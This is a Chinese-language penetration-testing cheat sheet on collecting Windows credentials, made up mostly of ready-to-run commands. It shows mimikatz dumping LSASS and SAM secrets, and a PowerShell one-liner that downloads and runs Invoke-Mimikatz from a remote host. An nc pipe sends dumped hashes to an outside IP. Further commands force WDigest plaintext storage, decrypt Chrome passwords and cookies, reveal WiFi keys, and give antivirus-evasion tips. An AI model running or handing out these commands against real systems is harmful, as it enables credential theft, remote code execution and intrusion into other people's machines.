# 凭证信息收集

## 凭证获取工具

常用来获取 windows 密码的工具:
1、mimikatz
2、wce
3、pwddump7
4、ophcrack
5、procdump+mimikatz
6、LaZagne

密码 HASH
LM & NTLM

Windows 本地 hash:
https://www.secpulse.com/archives/65256.html

Vindows 系统下 hash 密码格式:
用户名称:RID:LM-HASH 值:NT-HASH 值

## Mimikatz

mimikatz For Win10T 载:

https://github.com/gentilkiwi/mimikatz/releases

### 常用命令
[PTH攻击](17_domain_%E5%9F%9F.md#mimikatz-pth-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB)

```sh
mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "log logon.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

**1x 版本:**

```sh
privilege::debug       //提升权限
inject::process lsass.exe sekurlsa.dl   //注入sekurlsa.dl到lsass.exe进程里
@getLogonPasswords     //获取密码
```

**Powershell 远程加载 mimikatz 脚本**

```ts
// IEX是加载到内存中执行的。
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.130/1');Invoke-Mimikatz -DumpCreds
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.130/1');Invoke-Mimikatz -DumpCreds"
```

杀软绕过: 1.大写小写。 2.用+号 拼凑。。
[Mimikatz 的 18 种免杀姿势及防御策略](https://www.freebuf.com/articles/system/234365.html)

```ts
v2.0 https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1
v2.2 https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1
```

输出重定向

```sh
攻击机: nc -lvvp 6666 > pass123.txt
靶机  : mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit" | nc.exe -v 47.101.214.85 6666
```

powershell IEX (New-Object Net.WebClient).DownloadString('https://127.0.0.1/f');Get-PassHashes // 不好使

### 获取远程登录凭据

[内网渗透 | 获取远程主机保存的 RDP 凭据密码](https://mp.weixin.qq.com/s/F4AjedMpzObUm7NH3484lw)

```bash
# 1.cmdkey /list务必在Session会话下执行 或 poiwerpick
cmdkey /list
# 2.导出凭据
mimikatz.exe "log log_dpapi.txt" "privilege::debug" "sekurlsa::dpapi" "exit"
# 3.导出SESSION信息
mimikatz.exe "log 54461880A4E364919FB23518091F65E1.txt" "privilege::debug" "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\54461880A4E364919FB23518091F65E1" "exit"
# 4.在log_dpapi.txt找到 54461880A4E364919FB23518091F65E1.txt中的guidMasterKey的值下面的masterKey, 读取明文
mimikatz "log plain1.txt" "dpapi::cred /in:%cred%\54461880A4E364919FB23518091F65E1 /masterkey:0ea407f34e8dbea06a9ce6ee42c61579bdfea6dd3e93d5b9aa36561c223922fe67a2bf18e5350e139bc977d88574cd1b4762c1183647b80e817c0327314cd29a" "exit"
```

### windows server 2012 及以上的系统明文

通过添加注册表，再通过例如锁屏、注销或重启等操作，让管理员重新登录及可以读取明文。

```sh
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

### FAQ 不能执行 powershell 远程命令

```ps
set-ExecutionPolicy RemoteSigned
或 Set-ExecutionPolicy -Scope CurrentUser
get-ExecutionPolicy
```

## 导出密码的几种方式

https://www.daimajiaoliu.com/daima/486f56b9d900403

procdump 导出

```ts
procdump64.exe -accepteula -ma lsass.dmp
mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

## wce 获取明文密码 win7 及以下

wce -w

## pwddump7 获取 hash

Pwddump7.exe > pass.txt
https://www.objectif-securite.ch/ophcrack

如果网站无法破解出 hash 值·我们可以使用 ophcrack 工具配合彩虹表自己破解.
工具下载:https://ophcrack.sourceforge.io/
彩虹表:
https://ophcrack.sourceforge.io/tables.php
http://project-rainbowcrack.com/table.htm

## Procdump+Mimikatz

Procdump lsass 进程导出:
For 32bits: procdump.exe -accepteula -ma lsass.exe lsass.dmp
For 64bits: procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
然后使用 mimikatz 还原密码:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"

## 注册表导出 hash

reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
导出后可以使用 cain 导人 system.hiv.security.hiv 获取统存中的明文信息.
mimikatz "lsadump sam /system:system.hiv /sam:sam.hiv" exit

python3 -m pip install impacket
windows: python secretsdump.py -sam sam.hiv -security security.hiv-system system.hiv LOCAL
linux: impacket -secretsdump -system system.hiv -ntds ntds.dit LOCAL

## sharpdump

## Windows Wifi 密码的获取

netsh wlan show profile
netsh wlan show profile name="ssid" key=clear

## 看 hosts

C:\Windows\System32\drivers\etc\hosts

## Windows IIS config

lIS6:
cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root

IIS7,8:
列出网站列表:%systemroot%/system32/inetsrv/appcmd.exe list site
列出网站物理路:%systemroot%\system32\inetsr\appcmd.exe list vdir
Mimikatz 读取 lIS7 配置文件密码:
mimikatz.exe privilege:debug log "iis:apphost /in:"%systemroot%\system32\inetsr\config\applicationHost.config" /live" exit

## windows 回收站信息获取

FOR /f "skip=1 tokens=1,2 delims=" %c in ('wmic useraccount get name^,sid') do dir /a/b C:\$Recycle.Bin\%d\ ^>%c.txt

## Chrpme 的密码和 cookie 获取

%localappdata%\Google\chrome\USERDA~1\default\LOGIND~ 1
%localappdata%\Google\chrome\USERDA~1\default\cookies

chrome 的用户信息·保存在本地文件为 sqlite 数据库格式

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit # 读 chrome 密码

## **lazagne** 综合获取信息
